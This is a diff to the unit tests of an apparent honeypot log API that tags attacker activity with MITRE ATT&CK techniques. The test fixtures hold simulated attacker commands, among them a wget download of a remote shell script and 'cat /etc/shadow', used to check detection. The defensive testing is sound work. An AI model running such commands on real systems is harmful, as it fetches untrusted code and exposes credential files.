@@ -286,7 +286,7 @@ class ApiTests(unittest.TestCase):
         r = self.client.get("/api/ips?q=10.0.0.1", headers=h)
         self.assertEqual(r.headers["x-total-count"], "2")
         r = self.client.get("/api/ips?date_from=2026-09-03T00:00:00Z", headers=h)  # last_seen >= Sep 3
-        self.assertEqual(sorted(a["ip"] for a in r.json()), ["10.0.0.1", "10.0.0.11", "192.168.1.5"])
+        self.assertEqual(sorted(a["ip"] for a in r.json()), ["10.0.0.1", "192.168.1.5"])
 
     def test_command_groups_over_all_commands(self):
         self.make_admin()
@@ -348,6 +348,93 @@ class ApiTests(unittest.TestCase):
         self.make_admin()
         r = self.client.get("/api/sessions", headers={**self.login(), "Origin": "http://localhost:5173"})
         self.assertIn("x-total-count", r.headers["access-control-expose-headers"].lower())
+
+    def _mitre_data(self):
+        """Two attackers: A brute-forces then logs in and runs commands, B only brute-forces."""
+        for e in (
+            ev("cowrie.session.connect", session="ma", src_ip="10.2.0.1", timestamp="2026-09-20T10:00:00Z"),
+            ev("cowrie.login.failed", session="ma", src_ip="10.2.0.1", username="root", password="x", timestamp="2026-09-20T10:00:01Z"),
+            ev("cowrie.login.success", session="ma", src_ip="10.2.0.1", username="root", password="y", timestamp="2026-09-20T10:00:02Z"),
+            ev("cowrie.command.input", session="ma", src_ip="10.2.0.1", input="uname -a; whoami", timestamp="2026-09-20T10:00:03Z"),
+            ev("cowrie.command.input", session="ma", src_ip="10.2.0.1", input="wget http://x/a.sh", timestamp="2026-09-21T10:00:03Z"),
+            ev("cowrie.session.connect", session="mb", src_ip="10.2.0.2", timestamp="2026-09-22T10:00:00Z"),
+            ev("cowrie.login.failed", session="mb", src_ip="10.2.0.2", username="a", password="b", timestamp="2026-09-22T10:00:01Z"),
+        ):
+            self.assertEqual(self.client.post("/ingest", json=e, headers=INGEST).status_code, 202)
+
+    def test_ingest_tags_commands_sessions_and_ips(self):
+        self._mitre_data()
+        db = self.db()
+        cmd = self.client.portal.call(lambda: db.commands.find_one({"input": "uname -a; whoami"}))
+        self.assertEqual(sorted(cmd["techniques"]), ["T1033", "T1082"])
+        self.assertEqual(cmd["rules_version"], 1)
+        ses = self.client.portal.call(lambda: db.sessions.find_one({"_id": "ma"}))
+        self.assertEqual(sorted(ses["techniques"]), ["T1033", "T1078", "T1082", "T1105", "T1110.001", "T1133"])
+        ip = self.client.portal.call(lambda: db.ip_intel.find_one({"_id": "10.2.0.2"}))
+        self.assertEqual(sorted(ip["techniques"]), ["T1110.001", "T1133"])
+
+    def test_mitre_summary_catalog_and_detail(self):
+        self.make_admin()
+        h = self.login()
+        self._mitre_data()
+        cat = self.client.get("/api/mitre/catalog", headers=h).json()
+        self.assertTrue(any(c["id"] == "T1110.001" and c["url"].endswith("/T1110/001/") for c in cat))
+        r = self.client.get("/api/mitre/summary", headers=h)
+        self.assertEqual(r.status_code, 200, r.text)
+        body = r.json()
+        rows = {t["id"]: t for t in body["techniques"]}
+        self.assertEqual(rows["T1133"]["occurrences"], 2)      # two connections
+        self.assertEqual(rows["T1110.001"]["occurrences"], 2)  # two failed logins
+        self.assertEqual(rows["T1110.001"]["ips"], 2)
+        self.assertEqual(rows["T1078"]["occurrences"], 1)
+        self.assertEqual(rows["T1082"]["occurrences"], 1)
+        self.assertEqual(rows["T1082"]["basis"], "command")
+        self.assertEqual(body["unique_ids"], len(rows))
+        self.assertEqual(body["total_ids"], sum(t["occurrences"] for t in rows.values()))
+        self.assertEqual(body["top_event"]["basis"], "event")
+        self.assertEqual(body["top_command"]["basis"], "command")
+        d = self.client.get("/api/mitre/T1082", headers=h).json()
+        self.assertEqual((d["commands"], d["sessions"], d["ips"]), (1, 1, 1))
+        self.assertTrue(d["rules"][0]["pattern"])
+        self.assertTrue(d["url"].endswith("/T1082/"))
+        self.assertEqual(self.client.get("/api/mitre/T9999", headers=h).status_code, 404)
+        self.assertEqual(self.client.get("/api/mitre/notanid", headers=h).status_code, 422)
+        for kind, n in (("commands", 1), ("ips", 1), ("sessions", 1)):
+            r = self.client.get(f"/api/mitre/T1082/{kind}", headers=h)
+            self.assertEqual((len(r.json()), r.headers["x-total-count"]), (n, str(n)), kind)
+        daily = self.client.get("/api/mitre/T1110.001/daily?days=30", headers=h).json()
+        self.assertEqual([x["date"] for x in daily], ["2026-09-20", "2026-09-22"])
+        self.assertEqual(self.client.get("/api/mitre/T1082", headers={}).status_code, 401)
+
+    def test_technique_filter_on_lists(self):
+        self.make_admin()
+        h = self.login()
+        self._mitre_data()
+        r = self.client.get("/api/sessions?technique=T1105", headers=h)
+        self.assertEqual([s["id"] for s in r.json()], ["ma"])
+        r = self.client.get("/api/ips?technique=T1110.001", headers=h)
+        self.assertEqual(r.headers["x-total-count"], "2")
+        r = self.client.get("/api/commands/groups?technique=T1105", headers=h)
+        self.assertEqual([g["text"] for g in r.json()], ["wget http://x/a.sh"])
+        self.assertIn("T1105", r.json()[0]["techniques"])
+        self.assertEqual(self.client.get("/api/sessions?technique=bad", headers=h).status_code, 422)
+
+    def test_mitre_backfill_tags_old_rows_once(self):
+        from app import backfill
+        t = datetime(2026, 9, 1, tzinfo=timezone.utc)
+        self.run_async(self.db().commands.insert_one(
+            {"session_id": "old", "src_ip": "10.3.0.1", "timestamp": t, "input": "cat /etc/shadow"}))
+        self.run_async(self.db().sessions.insert_one({"_id": "old", "src_ip": "10.3.0.1", "start_time": t}))
+        self.run_async(self.db().ip_intel.insert_one({"_id": "10.3.0.1", "total_sessions": 1}))
+        self.run_async(self.db().auth_attempts.insert_one(
+            {"session_id": "old", "src_ip": "10.3.0.1", "success": False, "timestamp": t}))
+        first = self.client.portal.call(lambda: backfill.backfill_mitre(self.db(), rebuild=True))  # rebuild: the start-up task may already have set the marker
+        self.assertFalse(first["skipped"])
+        ses = self.client.portal.call(lambda: self.db().sessions.find_one({"_id": "old"}))
+        self.assertEqual(sorted(ses["techniques"]), ["T1003.008", "T1110.001", "T1133"])
+        ip = self.client.portal.call(lambda: self.db().ip_intel.find_one({"_id": "10.3.0.1"}))
+        self.assertEqual(sorted(ip["techniques"]), ["T1003.008", "T1110.001", "T1133"])
+        self.assertTrue(self.client.portal.call(lambda: backfill.backfill_mitre(self.db()))["skipped"])
 
     def test_security_headers_and_cors(self):
         r = self.client.get("/health")
